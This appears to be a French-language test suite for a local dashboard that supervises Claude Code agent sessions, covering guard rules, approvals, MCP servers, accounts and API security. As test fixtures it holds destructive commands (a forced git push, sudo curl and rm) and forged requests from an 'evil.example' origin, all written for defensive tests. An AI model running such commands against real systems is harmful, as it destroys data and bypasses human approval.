  projects: arr({ path: 'string', name: 'string', file: 'string', servers: arr({ ...Server, disabled: 'bool' }), readOnly: opt('string') }),
  local: arr({ path: 'string', name: 'string', servers: arr({ ...Server, disabled: 'bool' }) }),
  connectors: arr({ name: 'string', accountId: opt('string'), uses7d: 'int', service: SERVICE, health: Health }),
  connectorsDefault: oneOf('on', 'off'),
  healthCheck: { running: 'bool', startedAt: opt(ISO), checkedAt: opt(ISO) },
};
const Accounts = {
  accounts: arr({ ...AccountSummary, configDir: opt('string'), keychainItem: 'string', dirReady: 'bool' }),
  defaultForNew: 'string',
  wrapper: { path: 'string', active: 'bool' },
};
const conforms = (v, s) => assert.deepEqual(check(v, s), [], 'réponse hors contrat');

// ---------- lecture ----------

test('vue d\'ensemble : contrat, conversation bloquée par un garde-fou, attentes fantômes écartées', async () => {
  const r = await get('/api/v2/overview');
  assert.equal(r.status, 200);
  conforms(r.body, Overview);
  noSecret(r);
  const o = r.body;
  const a = o.conversations.find((c) => c.id === SID_A);
  const b = o.conversations.find((c) => c.id === SID_B);
  assert.equal(o.conversations[0].id, SID_A, 'ouvertes d\'abord');
  assert.equal(a.status, 'blocked');
  assert.equal(a.running, true);
  assert.equal(b.status, 'closed');
  assert.equal(a.accountId, 'travail1');
  assert.equal(a.autoAccept, true);
  assert.equal(a.autoAcceptOverride, null);
  assert.equal(a.connectors, 'on', 'sans le lanceur, rien ne coupe les connecteurs : ils sont chargés');
  // une seule attente en cours : la fantôme (délai passé), celle au processus mort et celle où l'utilisateur a répondu sont écartées
  const pending = o.toReview.filter((x) => x.id.startsWith('g:'));
  assert.equal(pending.length, 1);
  assert.equal(o.toReview[0], pending[0], 'ce qui attend maintenant passe en premier');
  const g = pending[0];
  assert.equal(g.kind, 'blocked');
  assert.equal(g.title, 'git push forcé ou suppression de branche distante');
  assert.match(g.detail, /^Pousser en force · décide ici ou dans VS Code, sinon refusée dans (8|9) min\.$/);
  assert.deepEqual([g.state, g.pendingId, g.command, g.rule, g.cwd, g.byAgent, g.needsPassword],
    ['waiting', String(HOOK_PUSH), 'git push --force origin main', 'git push forcé ou suppression de branche distante', CWD, null, false]);
  assert.ok(Math.abs(Date.parse(g.expiresAt) - (NOW + 8 * 60_000)) < 5000, 'échéance : début de l\'attente + guard.waitMin');
  const q = o.toReview.find((x) => x.kind === 'question');
  assert.equal(q.id, 'q:q1');
  assert.equal(q.conversationTitle, a.title);
  assert.equal(q.question.items[0].chosen, 'Fond B (recommandé)');
  // actions refusées depuis le dernier passage : à faire soi-même, avec la commande (masquée) et le dossier
  const blocked = o.toReview.filter((x) => x.id.startsWith('b:'));
  assert.equal(blocked.length, 2, 'le refus de l\'utilisateur depuis l\'app n\'est pas « à faire toi-même »');
  assert.ok(blocked.every((x) => x.kind === 'blocked' && x.state === 'blocked' && /^Refusée/.test(x.detail) && x.cwd === CWD && x.needsPassword === true));
  const withKey = blocked.find((x) => x.ts === iso(-58));
  assert.equal(withKey.command, 'sudo curl -H "Authorization: Bearer ••••" https://api.example.com/y');
  assert.equal(withKey.byAgent, 'agent-verif');
  assert.match(withKey.detail, /^Refusée faute de réponse : /);
  // limites : celle de A court encore, celle de B est déjà remise à zéro
  const limits = o.toReview.filter((x) => x.kind === 'limit');
  assert.deepEqual(limits.map((x) => x.conversationId), [SID_A]);
  assert.match(limits[0].detail, /session limit/);
  assert.equal(a.needsYou, o.toReview.filter((x) => x.conversationId === SID_A).length);
  assert.equal(a.needsYou, 5);
  assert.equal(b.needsYou, 0, 'limite remise à zéro : plus rien à regarder');
  // depuis une heure (glissante) : les acceptations d'il y a 65 à 80 min n'y sont plus, ni la limite de B
  assert.deepEqual(o.sinceSummary, { accepted: 0, questionsAuto: 1, blocked: 2, refused: 1, failed: 0, reports: o.sinceSummary.reports, testsFailed: 1, limits: 1 });
  assert.equal(o.settings.questionsAuto, false);
  assert.equal(o.settings.guard.rules.length, DEFAULT_GUARDS.length);
  assert.equal(o.engine.wrapperActive, false);
  assert.equal(o.accounts[0].email, 'alex@example.com');
  assert.equal(o.accounts[0].usage.week.pct, 40);
});

test('cartes : progression, tests, acceptations du jour et depuis le dernier passage, artefacts ; fil des décisions', async () => {
  const o = (await get('/api/v2/overview')).body;
  const a = o.conversations.find((c) => c.id === SID_A);
  const b = o.conversations.find((c) => c.id === SID_B);
  assert.deepEqual(a.progress, { done: 1, total: 2, label: 'Tâches', current: 'Tester la page' });
  assert.deepEqual([a.tests.failedRecent, a.tests.running, a.tests.lastOk, a.tests.lastTitle], [1, 0, true, 'Lancer les tests']);
  assert.equal(a.tests.failures.length, 1);
  assert.deepEqual([a.tests.failures[0].kind, a.tests.failures[0].title], ['types', 'Vérifier les types']);
  assert.match(a.tests.failures[0].line, /error TS2322/);
  // acceptations de Vigie (auto-accepte, question-auto) : depuis minuit (heure locale) et depuis le dernier passage
  const midnight = new Date(NOW); midnight.setHours(0, 0, 0, 0);
  const today = [-80, -70, -65, -50].filter((m) => NOW + m * 60_000 >= midnight.getTime()).length;
  assert.deepEqual(a.accepted, { today, sinceSeen: 1 }, 'depuis une heure : seule celle d\'il y a 50 min');
  assert.deepEqual(b.accepted, { today: 0, sinceSeen: 0 });
  assert.deepEqual(a.artifacts, { count: 0, last: null });
  assert.equal(b.progress, null);
  // fil : décisions de Vigie toutes conversations confondues, plus récent d'abord
  const f = o.recentAccepted;
  assert.ok(f.length >= 10 && f.length <= 30);
  assert.deepEqual([f[0].decision, f[0].kind, f[0].conversationId, f[0].conversationTitle, f[0].project], ['waiting', 'push', SID_A, a.title, 'atelier']);
  assert.equal(f.filter((x) => x.decision === 'waiting').length, 1, 'les attentes finies n\'y sont pas');
  const old = f.find((x) => x.ts === iso(-48));
  assert.deepEqual([old.kind, old.title, old.detail, old.decision], ['question', 'Quelle couleur ?', 'Quelle couleur ? [Bleu / Vert]', 'you'], 'ancienne ligne en JSON : la question, lisible');
  assert.equal(f.find((x) => x.ts === iso(-57)).decision, 'denied');
  assert.equal(f.find((x) => x.ts === iso(-58)).agent, 'agent-verif');
});

test('part de la semaine : poids de la conversation / poids du compte × pourcentage du compte', async () => {
  const o = (await get('/api/v2/overview')).body;
  const a = o.conversations.find((c) => c.id === SID_A).weekPct;
  const b = o.conversations.find((c) => c.id === SID_B).weekPct;
  assert.ok(a > b && b > 0, `${a} > ${b} > 0`);
  assert.ok(Math.abs(a + b - 40) <= 0.11, 'les conversations du compte se partagent ses 40 %');
});

test('détail : acceptées avec type et décision, MCP par étage, secrets masqués', async () => {
  const r = await get(`/api/v2/conversation/${SID_A}`);
  assert.equal(r.status, 200);
  conforms(r.body, Detail);
  noSecret(r);
  const d = r.body;
  assert.equal(d.summary.status, 'blocked');
  assert.equal(d.summary.branch, 'main');
  assert.equal(d.summary.accepted.sinceSeen, 1, 'depuis une heure');
  assert.equal(d.now.plan, null);
  assert.equal(d.now.tasksTs, iso(-59));
  const acc = d.accepted;
  assert.equal(acc[0].decision, 'waiting', 'l\'attente en cours, en tête');
  assert.equal(acc[0].kind, 'push');
  assert.equal(acc.filter((x) => x.decision === 'waiting').length, 1, 'les attentes finies ne sont pas listées');
  const by = (t) => acc.find((x) => x.title === t);
  assert.equal(by('Lancer les tests').kind, 'command');
  assert.equal(by('Lancer les tests').decision, 'auto');
  assert.equal(by('Modifie accueil.tsx').kind, 'file');
  assert.equal(by('Quel fond ?').kind, 'question');
  assert.equal(by('Quel fond ?').detail, 'Choisi : Fond B (recommandé)');
  assert.equal(by('Quelle couleur ?').detail, 'Quelle couleur ? [Bleu / Vert]', 'ancienne ligne en JSON : la question, lisible');
  assert.ok(acc.some((x) => x.decision === 'blocked' && x.detail.startsWith('Commande administrateur (sudo) · ')));
  assert.ok(acc.some((x) => x.decision === 'denied'));
  assert.ok(acc.some((x) => x.decision === 'you'), 'L\'utilisateur a répondu lui-même');
  assert.ok(acc.some((x) => x.detail?.includes('Authorization: Bearer ••••')), 'commande masquée');
  const mcp = Object.fromEntries(d.mcp.map((m) => [m.name, m]));
  assert.deepEqual([mcp['figma-perso'].scope, mcp['figma-perso'].uses, mcp['figma-perso'].enabled], ['user', 1, true]);
  assert.deepEqual([mcp['figma-desktop'].scope, mcp['figma-desktop'].uses], ['local', 0]);
  assert.deepEqual([mcp.supabase.scope, mcp.supabase.enabled], ['project', true]);
  assert.deepEqual([mcp.Gmail.scope, mcp.Gmail.uses, mcp.Gmail.enabled, mcp.Gmail.service], ['connector', 1, true, 'gmail']);
  assert.ok(d.mcp.every((m) => m.status === 'unknown'), 'pas encore de relevé');
  assert.equal((await get('/api/v2/conversation/00000000-0000-4000-8000-000000000000')).status, 404);
  assert.equal((await get('/api/v2/conversation/pas-un-identifiant')).status, 404);
});

test('MCP et comptes : contrat, connecteur rattaché au compte, rien de secret', async () => {
  const m = await get('/api/v2/mcp');
  assert.equal(m.status, 200);
  conforms(m.body, Mcp);
  noSecret(m);
  assert.deepEqual(m.body.connectors.map((c) => [c.name, c.accountId]), [['Gmail', 'travail1']]);
  assert.equal(m.body.projects.find((p) => p.path === CWD).servers[0].name, 'supabase');
  assert.deepEqual(m.body.healthCheck, { running: false, startedAt: null, checkedAt: null });
  const a = await get('/api/v2/accounts');
  assert.equal(a.status, 200);
  conforms(a.body, Accounts);
  assert.equal(a.body.defaultForNew, 'travail1');
  assert.equal(a.body.wrapper.active, false);
});

test('état réel des MCP : relevé à la demande (faux claude mcp list), par compte et par dossier, sans secret', async () => {
  let r = await post('/api/v2/mcp/check', {});
  assert.equal(r.status, 200, JSON.stringify(r.body));
  assert.equal(r.body.ok, true);
  assert.match(r.body.startedAt, /^\d{4}-/);
  let inv;
  for (let i = 0; i < 100; i++) {
    inv = await get('/api/v2/mcp');
    if (inv.body.healthCheck.checkedAt && !inv.body.healthCheck.running) break;
    await new Promise((res) => setTimeout(res, 100));
  }
  conforms(inv.body, Mcp);
  noSecret(inv);
  const st = (list) => list.map((h) => [h.accountId, h.status]);
  const user = inv.body.user.find((s) => s.name === 'figma-perso');
  assert.deepEqual(st(user.health), [['travail1', 'connected']]);
  assert.equal(user.needsAuth, false);
  assert.deepEqual(st(inv.body.connectors.find((c) => c.name === 'Gmail').health), [['travail1', 'needs-auth']]);
  assert.deepEqual(st(inv.body.projects.find((p) => p.path === CWD).servers.find((s) => s.name === 'supabase').health), [['travail1', 'connected']]);
  assert.deepEqual(st(inv.body.local.find((p) => p.path === CWD).servers.find((s) => s.name === 'figma-desktop').health), [['travail1', 'failed']]);
  const d = await get(`/api/v2/conversation/${SID_A}`);
  noSecret(d);
  const status = Object.fromEntries(d.body.mcp.map((m) => [m.name, m.status]));
  assert.deepEqual(status, { 'figma-perso': 'connected', Gmail: 'needs-auth', supabase: 'connected', 'figma-desktop': 'failed' });
  r = await post('/api/v2/mcp/check', { accountId: 'inconnu' });
  assert.equal(r.status, 400);
  assert.equal(r.body.error, 'Compte inconnu');
  assert.equal((await post('/api/v2/mcp/check', { path: 'relatif' })).status, 400);
});

// ---------- écritures ----------

test('réglages généraux : valeurs vérifiées, saisie vide refusée, en-tête obligatoire', async () => {
  let r = await post('/api/v2/settings', { questionsAuto: true, questionWaitMin: 30, connectorsDefault: 'on', guard: { waitMin: 5, rules: [{ id: 'sudo', disabled: true }] } });
  assert.equal(r.status, 200);
  assert.equal(r.body.settings.questionsAuto, true);
  let s = rj(path.join(DATA, 'state.json'));
  assert.deepEqual([s.questions, s.questionWaitMin, s.connectorsDefault, s.guard.waitMin], ['wait', 30, 'on', 5]);
  assert.equal(s.guard.rules.find((x) => x.id === 'sudo').disabled, true);
  for (const body of [{ questionWaitMin: '' }, { questionWaitMin: null }, { questionWaitMin: 0 }, { guard: { waitMin: '' } }, { guard: { rules: [{ id: 'inconnu', disabled: true }] } },
    { autoAccept: 'oui' }, { connectorsDefault: 'peut-être' }]) {
    r = await post('/api/v2/settings', body);
    assert.equal(r.status, 400, JSON.stringify(body));
    assert.equal(r.body.ok, false);
    assert.equal(typeof r.body.error, 'string');
  }
  s = rj(path.join(DATA, 'state.json'));
  assert.deepEqual([s.questionWaitMin, s.guard.waitMin], [30, 5], 'rien n\'a bougé');
  assert.equal((await post('/api/v2/settings', { autoAccept: false }, { 'Content-Type': 'application/json' })).status, 403);
  assert.equal((await post('/api/v2/settings', { autoAccept: false }, { 'X-Vigie': '1', Origin: 'https://evil.example' })).status, 403);
  assert.equal(rj(path.join(DATA, 'state.json')).autoAccept, true);
  r = await post('/api/v2/settings', { questionsAuto: false, questionWaitMin: 20, connectorsDefault: 'off', guard: { waitMin: 10, rules: [{ id: 'sudo', disabled: false }] } });
  assert.equal(r.status, 200);
});

test('jeton d\'accès : exigé partout sur /api/ (lecture comprise), sauf l\'état de santé ; fichier privé', async () => {
  const file = path.join(DATA, 'api-token');
  assert.match(token(), /^[0-9a-f]{64}$/);
  assert.equal(fs.statSync(file).mode & 0o777, 0o600);
  for (const p of ['/api/v2/overview', '/api/v2/history', '/api/v2/accounts', `/api/v2/conversation/${SID_A}`]) {
    assert.equal((await raw('GET', p, { token: null })).status, 401, p);
    assert.equal((await raw('GET', p, { token: 'f'.repeat(64) })).status, 401, `${p} : mauvais jeton`);
  }
  const before = rj(path.join(DATA, 'state.json')).autoAccept;
  const r = await raw('POST', '/api/v2/settings', { body: { autoAccept: !before }, headers: { 'Content-Type': 'application/json', 'X-Vigie': '1' }, token: null });
  assert.equal(r.status, 401);
  assert.match(r.body.error, /jeton/);
  assert.equal(rj(path.join(DATA, 'state.json')).autoAccept, before, 'rien n\'a changé');
  assert.equal((await raw('GET', '/api/v2/health', { token: null })).status, 200, 'l\'installeur attend le moteur sans jeton');
  assert.equal((await get('/api/v2/overview')).status, 200);
});

test('réglages d\'une conversation, et bascule de compte', async () => {
  let r = await post(`/api/v2/conversation/${SID_A}/settings`, { autoAccept: false, connectors: 'on' });
  assert.equal(r.status, 200);
  assert.deepEqual(rj(path.join(DATA, 'state.json')).sessions[SID_A], { autoAccept: false, connectors: 'on' });
  let a = (await get('/api/v2/overview')).body.conversations.find((c) => c.id === SID_A);
  assert.deepEqual([a.autoAccept, a.autoAcceptOverride, a.connectors], [false, false, 'on']);
  assert.equal((await get(`/api/v2/conversation/${SID_A}`)).body.mcp.find((m) => m.name === 'Gmail').enabled, true);
  r = await post(`/api/v2/conversation/${SID_A}/settings`, { autoAccept: null, connectors: null });
  assert.equal(r.status, 200);
  assert.equal(rj(path.join(DATA, 'state.json')).sessions[SID_A], undefined);
  assert.equal(r.body.conversation.connectors, 'on', 'sans le lanceur, les connecteurs restent chargés');
  a = (await get('/api/v2/overview')).body.conversations.find((c) => c.id === SID_A);
  assert.deepEqual([a.autoAccept, a.autoAcceptOverride, a.connectors], [true, null, 'on']);

  r = await post(`/api/v2/conversation/${SID_B}/settings`, { accountId: 'travail1' });
  assert.equal(r.status, 200);
  assert.equal(r.body.switch.state, 'done');
  assert.equal(typeof r.body.switch.message, 'string');
  assert.equal(rj(path.join(DATA, 'accounts.json')).sessions[SID_B], 'travail1');
  r = await post(`/api/v2/conversation/${SID_B}/settings`, { accountId: 'inconnu', autoAccept: false });
  assert.equal(r.status, 400);
  assert.equal(r.body.error, 'Compte inconnu.');
  assert.equal(rj(path.join(DATA, 'state.json')).sessions[SID_B], undefined, 'bascule refusée : rien d\'autre n\'est changé');
  assert.equal((await post(`/api/v2/conversation/${SID_B}/settings`, {})).status, 400);
  assert.equal((await post(`/api/v2/conversation/${SID_B}/settings`, { connectors: 'peut-être' })).status, 400);
  assert.equal((await post('/api/v2/conversation/__proto__/settings', { autoAccept: true })).status, 404);
});

test('action sensible en attente : autoriser ou refuser depuis l\'app (decisions.json), attente finie = 404', async () => {
  let r = await post(`/api/v2/pending/${HOOK_PUSH}`, { decision: 'peut-être' });
  assert.equal(r.status, 400);
  r = await post(`/api/v2/pending/${deadPid}`, { decision: 'deny' });
  assert.deepEqual([r.status, r.body.ok], [404, false], 'hook mort : l\'attente est finie');
  assert.equal((await post(`/api/v2/pending/${HOOK_OLD}`, { decision: 'allow' })).status, 404, 'délai passé');
  assert.equal((await post('/api/v2/pending/abc', { decision: 'allow' })).status, 404);
  r = await post(`/api/v2/pending/${HOOK_PUSH}`, { decision: 'allow' });
  assert.equal(r.status, 200, JSON.stringify(r.body));
  assert.equal(r.body.ok, true);
  assert.match(r.body.message, /^Autorisée/);
  const d = rj(path.join(DATA, 'decisions.json'))[String(HOOK_PUSH)];
  assert.deepEqual([d.decision, d.sessionId], ['allow', SID_A]);
  assert.ok(Math.abs(Date.parse(d.ts) - Date.now()) < 60_000);
  r = await post(`/api/v2/pending/${HOOK_PUSH}`, { decision: 'deny' });
  assert.equal(r.status, 200, 'L\'utilisateur change d\'avis avant que le hook ait lu : la dernière décision compte');
  assert.equal(rj(path.join(DATA, 'decisions.json'))[String(HOOK_PUSH)].decision, 'deny');
  assert.equal((await post(`/api/v2/pending/${HOOK_PUSH}`, { decision: 'allow' }, { 'Content-Type': 'application/json' })).status, 403, 'X-Vigie obligatoire');
  // décidée, pas encore lue par le hook : plus montrée (elle ne réapparaît pas le temps qu'il la prenne)
  const waiting = async () => (await get('/api/v2/overview')).body.toReview.some((x) => x.pendingId === String(HOOK_PUSH));
  assert.equal(await waiting(), false);
  fs.writeFileSync(path.join(DATA, 'decisions.json'), '{}'); // le hook l'a lue (ici : simulée, il attend toujours)
  assert.equal(await waiting(), true);
});

test('ouvrir : la conversation dans VS Code (dossier, puis l\'onglet quand sa fenêtre est prête), rien d\'autre', async () => {
  fs.rmSync(MAC_LOG, { force: true });
  let r = await post('/api/v2/open', { kind: 'conversation', id: SID_A });
  assert.equal(r.status, 200, JSON.stringify(r.body));
  assert.equal(r.body.opened, 'full', 'fenêtre de son dossier déjà là');
  assert.equal(r.body.openUrl, `vscode://anthropic.claude-code/open?session=${SID_A}`);
  assert.deepEqual(macCalls().map((c) => [c.bin, c.args]), [['open', ['-a', 'Visual Studio Code', CWD]], ['open', [`vscode://anthropic.claude-code/open?session=${SID_A}`]]]);
  // la fenêtre de son dossier ne répond pas : le lien ne part pas (il ouvrirait la conversation dans une autre fenêtre)
  fs.rmSync(MAC_LOG, { force: true });
  const t0 = Date.now();
  r = await post('/api/v2/open', { kind: 'conversation', id: SID_B });
  assert.equal(r.status, 200, JSON.stringify(r.body));
  assert.deepEqual([r.body.opened, r.body.openUrl], ['folder', null]);
  assert.equal(r.body.message, 'VS Code est ouvert sur autre, mais Claude Code n\'a pas répondu à temps : ouvre la conversation depuis son panneau.');
  assert.ok(Date.now() - t0 >= 1500, 'attendue jusqu\'au bout (VIGIE_IDE_WAIT_MS)');
  assert.deepEqual(macCalls().map((c) => [c.bin, c.args]), [['open', ['-a', 'Visual Studio Code', OTHER]]]);
  assert.equal((await post('/api/v2/open', { kind: 'conversation', id: '00000000-0000-4000-8000-000000000000' })).status, 404);
  assert.equal((await post('/api/v2/open', { kind: 'conversation', id: '../..' })).status, 404);
  assert.equal((await post('/api/v2/open', { kind: 'fenêtre' })).status, 400);
});

test('ouvrir : Terminal avec la commande exacte tapée mais pas lancée, retrouvée à partir du texte masqué', async () => {
  const o = (await get('/api/v2/overview')).body;
  const item = o.toReview.find((x) => x.ts === iso(-58) && x.id.startsWith('b:'));
  assert.ok(item.command.includes('••••'));
  fs.rmSync(MAC_LOG, { force: true });
  let r = await post('/api/v2/open', { kind: 'terminal', command: item.command, cwd: item.cwd });
  assert.equal(r.status, 200, JSON.stringify(r.body));
  assert.equal(r.body.mode, 'typed');
  noSecret(r);
  const calls = macCalls();
  assert.equal(calls.length, 1);
  assert.equal(calls[0].bin, 'osascript');
  const script = calls[0].args.join(' ');
  for (const s of SECRETS) assert.ok(!script.includes(s), 'jamais la commande dans le texte de la fenêtre');
  assert.match(script, /do script "clear; cd '[^']*atelier' && print -rz -- \\"\$\(<'[^']+\.txt'\)\\"; rm -f '[^']+\.txt'"/);
  const file = /\$\(<'([^']+)'\)/.exec(script)[1];
  assert.ok(file.startsWith(path.join(DATA, 'terminal')));
  assert.equal(fs.readFileSync(file, 'utf8'), `sudo curl -H "Authorization: Bearer ${SECRETS[4]}" https://api.example.com/y`, 'la vraie commande, pas le texte masqué');
  assert.equal(fs.statSync(file).mode & 0o777, 0o600);
  // par l'élément de « À regarder », et par l'attente en cours
  r = await post('/api/v2/open', { kind: 'terminal', id: item.id });
  assert.equal(r.status, 200);
  r = await post('/api/v2/open', { kind: 'terminal', pendingId: String(HOOK_PUSH) });
  assert.equal(r.status, 200);
  const last = macCalls().at(-1).args.join(' ');
  assert.equal(fs.readFileSync(/\$\(<'([^']+)'\)/.exec(last)[1], 'utf8'), 'git push --force origin main');
  // texte masqué inconnu : rien n'est ouvert
  const before = macCalls().length;
  r = await post('/api/v2/open', { kind: 'terminal', command: 'sudo rm ••••' });
  assert.equal(r.status, 400);
  assert.equal((await post('/api/v2/open', { kind: 'terminal', command: '' })).status, 400);
  assert.equal(macCalls().length, before);
});

test('« À regarder » : écarter un élément le retire de la liste et du compteur de la conversation', async () => {
  let o = (await get('/api/v2/overview')).body;
  const item = o.toReview.find((x) => x.ts === iso(-60) && x.id.startsWith('b:'));
  const needs = o.conversations.find((c) => c.id === SID_A).needsYou;
  const r = await post(`/api/v2/review/${encodeURIComponent(item.id)}/dismiss`, {});
  assert.equal(r.status, 200, JSON.stringify(r.body));
  o = (await get('/api/v2/overview')).body;
  assert.ok(!o.toReview.some((x) => x.id === item.id));
  assert.equal(o.conversations.find((c) => c.id === SID_A).needsYou, needs - 1);
  assert.ok(rj(path.join(DATA, 'ui.json')).dismissed[item.id], 'noté dans data/ui.json');
  assert.ok(rj(path.join(DATA, 'ui.json')).lastSeen, 'le dernier passage est gardé');
  assert.equal((await post('/api/v2/review/n%27importe%20quoi/dismiss', {})).status, 404);
});

test('connecter un MCP : connecteur par le navigateur, MCP OAuth dans un pseudo-terminal (sans Terminal), refus sans appel', async () => {
  fs.rmSync(MAC_LOG, { force: true });
  let r = await post('/api/v2/mcp/connect', { name: 'Gmail' });
  assert.equal(r.status, 200, JSON.stringify(r.body));
  assert.equal(r.body.mode, 'browser');
  const logins = fs.readFileSync(FAKE_LOG, 'utf8').trim().split('\n').map((l) => JSON.parse(l));
  assert.deepEqual(logins.map((x) => [x.name, x.configDir]), [['claude.ai Gmail', null]], 'le connecteur sous son nom de CLI, compte principal');
  r = await post('/api/v2/mcp/connect', { name: 'figma-desktop', path: CWD });
  assert.equal(r.status, 200, JSON.stringify(r.body));
  assert.equal(r.body.mode, 'browser', 'MCP OAuth : le navigateur s\'ouvre, plus de Terminal');
  let mac = [];
  try { mac = macCalls(); } catch { /* aucun appel */ }
  assert.ok(!mac.some((c) => c.bin === 'osascript'), 'Terminal ne s\'ouvre pas');
  const lines = () => fs.readFileSync(FAKE_LOG, 'utf8').trim().split('\n').map((l) => JSON.parse(l));
  for (let i = 0; i < 100 && !lines().some((x) => x.name === 'figma-desktop'); i++) await new Promise((res) => setTimeout(res, 50));
  assert.ok(lines().some((x) => x.name === 'figma-desktop'), 'claude mcp login lancé pour figma-desktop');
  r = await post('/api/v2/mcp/connect', { name: 'figma-perso' });
  assert.equal(r.status, 400);
  assert.match(r.body.error, /^Déjà connecté/, 'relevé « connected » : reconnecter effacerait ses jetons');
  r = await post('/api/v2/mcp/connect', { name: 'figma-perso', force: true });
  assert.equal(r.status, 400);
  assert.match(r.body.error, /rien à autoriser/);
  assert.equal((await post('/api/v2/mcp/connect', { name: '' })).status, 400);
  assert.equal((await post('/api/v2/mcp/connect', { name: 'Gmail', accountId: 'inconnu' })).status, 400);
  assert.equal(fs.readFileSync(FAKE_LOG, 'utf8').trim().split('\n').length, 2, 'aucun autre appel à la CLI');
  const journal = fs.readFileSync(path.join(DATA, 'mcp-connect.log'), 'utf8');
  for (const s of SECRETS) assert.ok(!journal.includes(s), 'journal des connexions sans secret');
});

test('questions à relire : changer prépare le texte de correction, puis la question sort de la liste', async () => {
  let r = await post('/api/v2/questions/q1/review', { action: 'change', answers: { 'Quel fond ?': 'Fond Z' } });
  assert.equal(r.status, 400);
  r = await post('/api/v2/questions/q%3Aq1/review', { action: 'change', answers: { 'Quel fond ?': 'Fond A' } });
  assert.equal(r.status, 200);
  assert.match(r.body.correction, /« Fond A » au lieu de « Fond B \(recommandé\) »/);
  assert.equal(r.body.delivered, false);
  assert.equal(r.body.openUrl, `vscode://anthropic.claude-code/open?session=${SID_A}`, 'conversation ouverte : pas de texte pré-rempli');
  const o = (await get('/api/v2/overview')).body;
  assert.ok(!o.toReview.some((x) => x.kind === 'question'));
  assert.equal((await post('/api/v2/questions/inconnue/review', { action: 'ok' })).status, 404);
});

test('depuis une heure : fenêtre glissante, rien à remettre à zéro', async () => {
  const o = (await get('/api/v2/overview')).body;
  assert.ok(Math.abs(Date.parse(o.since) - (Date.now() - 3600_000)) < 2 * 60_000, 'il y a une heure');
  assert.ok(o.toReview.some((x) => x.id.startsWith('g:')), 'ce qui attend maintenant reste');
  assert.equal((await post('/api/v2/seen', {})).status, 404, 'plus de « J\'ai tout vu »');
});

test('MCP : projet, coupure pour un projet, Mac via la CLI (fichiers temporaires)', async () => {
  const cfg = { type: 'stdio', command: 'npx', args: ['-y', 'netlify-mcp'] };
  let r = await post('/api/v2/mcp/project', { action: 'add', path: CWD, name: 'netlify', config: cfg });
  assert.equal(r.status, 200, JSON.stringify(r.body));
  assert.deepEqual(rj(path.join(CWD, '.mcp.json')).mcpServers.netlify, cfg);
  assert.ok(r.body.backup.startsWith(path.join(DATA, 'backups', 'mcp')));
  r = await post('/api/v2/mcp/project', { action: 'add', path: CWD, name: 'netlify', config: cfg });
  assert.equal(r.status, 400);
  assert.equal(r.body.error, 'Déjà présent dans ce projet');
  r = await post('/api/v2/mcp/project', { action: 'remove', path: CWD, name: 'netlify' });
  assert.equal(r.status, 200);
  assert.equal(rj(path.join(CWD, '.mcp.json')).mcpServers.netlify, undefined);
  assert.equal(rj(path.join(CWD, '.mcp.json')).mcpServers.supabase.env.SUPABASE_ACCESS_TOKEN, SECRETS[2], 'les autres serveurs gardent leurs valeurs');
  assert.equal((await post('/api/v2/mcp/project', { action: 'add', path: TMP, name: 'x', config: cfg })).status, 400);
  assert.equal((await post('/api/v2/mcp/project', { action: 'renommer' })).status, 400);

  r = await post('/api/v2/mcp/disable', { path: CWD, name: 'figma-perso', disabled: true });
  assert.equal(r.status, 200, JSON.stringify(r.body));
  assert.deepEqual(rj(path.join(HOME, '.claude.json')).projects[CWD].disabledMcpServers, ['figma-perso']);
  assert.equal((await get(`/api/v2/conversation/${SID_A}`)).body.mcp.find((m) => m.name === 'figma-perso').enabled, false);
  assert.equal((await post('/api/v2/mcp/disable', { path: CWD, name: 'figma-perso', disabled: false })).status, 200);
  assert.deepEqual(rj(path.join(HOME, '.claude.json')).projects[CWD].disabledMcpServers, []);
  assert.equal((await post('/api/v2/mcp/disable', { path: CWD, name: 'figma-perso', disabled: 'oui' })).status, 400);

  const art = { type: 'http', url: 'https://mcp.artlist.io/mcp' };
  r = await post('/api/v2/mcp/user', { action: 'add', name: 'artlist', config: art });
  assert.equal(r.status, 200, JSON.stringify(r.body));
  assert.deepEqual(rj(path.join(HOME, '.claude.json')).mcpServers.artlist, art);
  r = await post('/api/v2/mcp/user', { action: 'add', name: 'artlist', config: art });
  assert.equal(r.status, 400);
  assert.match(r.body.error, / : Déjà présent dans ce compte$/, 'erreur compte par compte, avec le nom du compte');
  assert.equal((await post('/api/v2/mcp/user', { action: 'remove', name: 'artlist' })).status, 200);
  assert.equal(rj(path.join(HOME, '.claude.json')).mcpServers.artlist, undefined);
  assert.equal(rj(path.join(HOME, '.claude.json')).mcpServers['figma-perso'].headers.Authorization, `Bearer ${SECRETS[0]}`);
  r = await post('/api/v2/mcp/user', { action: 'add', name: 'nom invalide!', config: art });
  assert.equal(r.status, 400);
  const inv = await get('/api/v2/mcp');
  noSecret(inv);
});

test('comptes : création d\'un dossier de compte et lanceur VS Code (fichiers temporaires)', async () => {
  let r = await post('/api/v2/accounts', { action: 'create', label: 'Perso test' });
  assert.equal(r.status, 200, JSON.stringify(r.body));
  assert.ok(r.body.account.configDir.startsWith(ACCOUNTS_ROOT));
  const view = (await get('/api/v2/accounts')).body;
  conforms(view, Accounts);
  assert.equal(view.accounts.length, 2);
  // compte pas encore connecté : une conversation ne peut pas y passer
  r = await post(`/api/v2/conversation/${SID_B}/settings`, { accountId: view.accounts[1].id });
  assert.equal(r.status, 400);
  r = await post('/api/v2/accounts', { action: 'wrapper', enable: true });
  assert.equal(r.status, 200, JSON.stringify(r.body));
  assert.match(fs.readFileSync(VSC, 'utf8'), /"claudeCode\.claudeProcessWrapper": /);
  const o = (await get('/api/v2/overview')).body;
  assert.equal(o.engine.wrapperActive, true);
  assert.equal(o.conversations.find((c) => c.id === SID_A).connectors, 'off', 'lanceur actif : le réglage (coupés par défaut) s\'applique');
  assert.equal((await get(`/api/v2/conversation/${SID_A}`)).body.mcp.find((m) => m.name === 'Gmail').enabled, false);
  r = await post('/api/v2/accounts', { action: 'wrapper', enable: false });
  assert.equal(r.status, 200);
  assert.doesNotMatch(fs.readFileSync(VSC, 'utf8'), /claudeProcessWrapper/);
  r = await post('/api/v2/accounts', { action: 'inventer' });
  assert.equal(r.status, 400);
  assert.equal(r.body.error, 'Action inconnue.');
});

// ---------- HTTP ----------

test('HTTP : adresses invalides, hôte, JSON, taille, méthode, en-têtes de sécurité', async () => {
  let r = await raw('GET', '//');
  assert.equal(r.status, 400, 'une adresse « // » ne fait plus tomber le serveur');
  r = await raw('GET', '/api/v2/overview', { headers: { Host: 'evil.example:4777' } });
  assert.equal(r.status, 403);
  r = await post('/api/v2/settings', 'pas du json');
  assert.deepEqual([r.status, r.body.error], [400, 'JSON illisible.']);
